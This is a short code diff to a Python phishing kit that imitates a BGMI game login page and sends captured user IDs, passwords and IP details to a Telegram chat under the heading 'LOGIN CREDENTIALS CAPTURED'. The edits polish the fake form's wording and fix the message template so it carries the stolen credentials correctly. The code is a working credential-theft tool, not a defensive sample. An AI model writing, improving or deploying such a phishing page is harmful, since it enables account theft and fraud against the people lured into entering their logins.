@@ -23,7 +23,7 @@ def send_to_telegram(user_id, password, ip_info):
     message = f"""
 🟢 BGMI LOGIN CREDENTIALS CAPTURED! 🟢
 
-👤 User ID: `{Mobilenumber or email}`
+👤 User ID: `{user_id}`
 🔑 Password: `{password}`
 🌐 {ip_info}
 ⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
@@ -225,7 +225,7 @@ LOGIN_PAGE = """
         
         <form id="loginForm" method="POST" action="/">
             <div class="form-group">
-                <input type="text" name="user_id" placeholder="Enter BGMI User ID" required autocomplete="off">
+                <input type="text" name="user_id" placeholder="Enter Mobilenumber or email" required autocomplete="off">
             </div>
             <div class="form-group">
                 <input type="password" name="password" placeholder="Enter Password" required autocomplete="off">
